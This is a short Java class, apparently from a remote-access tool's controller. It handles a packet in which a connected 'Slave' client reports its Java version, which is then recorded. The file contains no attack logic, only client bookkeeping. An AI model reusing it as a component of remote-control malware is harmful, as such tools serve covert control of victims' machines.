package com.redpois0n.packets;

import com.redpois0n.Slave;

public class PacketJAVAVER extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String version = slave.readLine();
		slave.setJavaVersion(version);
	}

}
